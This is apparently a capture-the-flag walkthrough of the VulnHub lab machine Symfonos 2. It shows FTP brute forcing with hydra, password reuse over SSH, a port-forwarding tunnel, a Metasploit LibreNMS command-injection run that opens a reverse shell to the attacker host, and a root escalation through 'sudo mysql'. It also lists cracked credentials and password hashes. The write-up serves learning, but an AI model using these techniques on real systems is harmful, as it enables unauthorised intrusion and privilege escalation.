# BOX NAME: Symfonos 2
**LINK**: https://www.vulnhub.com/entry/symfonos-2,331/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate SMB, FTP, SSH, WEB.
2. Password reuse on most servies
3. Proxyhandling from remote to local. 
4. GTFO-bin on second user go gain root.

Don't fall for the shadows..
Let me down some rabbit-holes but I eventually prevailed. Took me a while to find the localhost service running on port 8080. Still a fun box. The pictures make it great to.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.57
[+] URL:	http://symfonos.local
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-symfonos2.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 13:13 CEST
Nmap scan report for symfonos.local (10.77.0.57)
Host is up (0.00060s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9df85f8720e58cfa68477d716208adb9 (RSA)
|   256 042abb0656ead1931cd2780a00469d85 (ECDSA)
|_  256 28adacdc7e2a1cf64c6b47f2d6225b52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-28T11:13:53
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2023-04-28T06:13:53-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-symfonos2.log                         
http://symfonos.local [200 OK] Country[RESERVED][ZZ], HTTPServer[webfs/1.21], IP[10.77.0.57], webfs[1.21]

```

nikto-scan

```
└─$ nikto -h $IP -C all | tee nikto-symfonos2.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.57
+ Target Hostname:    10.77.0.57
+ Target Port:        80
+ Start Time:         2023-04-28 13:14:57 (GMT2)
---------------------------------------------------------------------------
+ Server: webfs/1.21
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker
+ 26641 requests: 1 error(s) and 2 item(s) reported on remote host
+ End Time:           2023-04-28 13:16:31 (GMT2) (94 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

fuzzing

```
#not much

```


</details>
<details><summary><ins>OTHER</ins></summary>

FTP (Port 21)
```
└─$ hydra -L usernames.txt -P /base/wordlists/password/rockyou.txt $IP ftp -t 64

aeolus:sergioteamo
```

SSH (Port 22)
```
Password reuse:
aeolus:sergioteamo

└─$ ssh aeolus@$IP          
The authenticity of host '10.77.0.57 (10.77.0.57)' can't be established.
ED25519 key fingerprint is SHA256:bVM6iESUngv842ilwZ5pthpPxRaIrgL4RxNNbnBFssQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.77.0.57' (ED25519) to the list of known hosts.
aeolus@10.77.0.57's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 18 08:52:59 2019 from 192.168.201.1
aeolus@symfonos2:~$ 
```
SMB (139,445)
```
└─$ smbclient -N //$IP/anonymous
Try "help" to get a list of possible commands.
smb: \> cd backups
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt (1589.5 KiloBytes/sec) (average 1589.6 KiloBytes/sec)
smb: \backups\> 

The log indicates a username to us. "aeolus"

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\aeolus (Local User)
S-1-22-1-1001 Unix User\cronus (Local User)
```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/var/backups/shadow.bak

```

**SUID's**:

```
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/bin/mount
/bin/su
/bin/ping
/bin/umount

```
**SGID's**:

```
/sbin/unix_chkpwd
/usr/bin/wall
/usr/bin/dotlockfile
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/dotlock.mailutils
/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/crontab
```
**NET**:

```
aeolus@symfonos2:/home$ ss -ralpn4
Netid  State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port              
udp    UNCONN     0      0                                                                                       *:68                                                                                                  *:*                  
udp    UNCONN     0      0                                                                             10.77.0.255:137                                                                                                 *:*                  
udp    UNCONN     0      0                                                                              10.77.0.57:137                                                                                                 *:*                  
udp    UNCONN     0      0                                                                                       *:137                                                                                                 *:*                  
udp    UNCONN     0      0                                                                             10.77.0.255:138                                                                                                 *:*                  
udp    UNCONN     0      0                                                                              10.77.0.57:138                                                                                                 *:*                  
udp    UNCONN     0      0                                                                                       *:138                                                                                                 *:*                  
udp    UNCONN     0      0                                                                                       *:161                                                                                                 *:*                  
tcp    LISTEN     0      80                                                                              localhost:3306                                                                                                *:*                  
tcp    LISTEN     0      50                                                                                      *:139                                                                                                 *:*                  
tcp    LISTEN     0      128                                                      -->>>>>>>>>>>>>>>>>    localhost:8080                                                                                                *:*                  
tcp    LISTEN     0      32                                                                                      *:21                                                                                                  *:*                  
tcp    LISTEN     0      128                                                                                     *:22                                                                                                  *:*                  
tcp    LISTEN     0      20                                                                              localhost:25                                                                                                  *:*                  
tcp    LISTEN     0      50                                                                                      *:445                                                                                                 *:*   
```
Something funny living on port 8080. Let's proxy that.
└─$ ssh -L 8080:localhost:8080 aeolus@$IP
Well what do you know. It's a libreNMS instance. And we can log-into it with the same credentials as ssh.


```
└─$ searchsploit libreNMS
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LibreNMS - addhost Command Injection (Metasploit)                                                                                                                                                              | linux/remote/46970.rb
LibreNMS - Collectd Command Injection (Metasploit)                                                                                                                                                             | linux/remote/47375.rb
LibreNMS 1.46 - 'addhost' Remote Code Execution                                                                                                                                                                | php/webapps/47044.py
LibreNMS 1.46 - 'search' SQL Injection                                                                                                                                                                         | multiple/webapps/48453.txt
LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection                                                                                                                                               | multiple/webapps/49246.py

Imma go with metasploits addhost module. 
```

```
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.77.0.35:4444 
[-] Exploit aborted due to failure: not-found: Failed to access the login page
[*] Exploiting target 127.0.0.1                                                                                                                      
[*] Started reverse TCP double handler on 10.77.0.35:4444                                                                                            
[*] Successfully logged into LibreNMS. Storing credentials...                                                                                        
[+] Successfully added device with hostname aylItZIC                                                                                                 
[*] Accepted the first client connection...                                                                                                          
[*] Accepted the second client connection...                                                                                                         
[+] Successfully deleted device with hostname aylItZIC and id #1                                                                                     
[*] Command: echo r4p6yRd6miytTtCv;                                                                                                                  
[*] Writing to socket A                                                                                                                              
[*] Writing to socket B                                                                                                                              
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "Trying: not found\r\nsh: 2: Connected: not found\r\nsh: 3: Escape: not found\r\nr4p6yRd6miytTtCv\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.77.0.35:4444 -> 10.77.0.57:45052) at 2023-04-28 13:59:50 +0200
[*] Session 1 created in the background.

```
```
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > sessions -i 1
[*] Starting interaction with 1...

id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
whoami
cronus
```
**OTHERS**:
```

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4be0cc32aba02ec4e0f010047be5ae9dee756960, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.9 (stretch)
Release:        9.9
Codename:       stretch


Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

aeolus:sergioteamo
cronus: N/A
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
sudo mysql -e '\! /bin/sh'
```
```
uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt

        Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,


```
</details>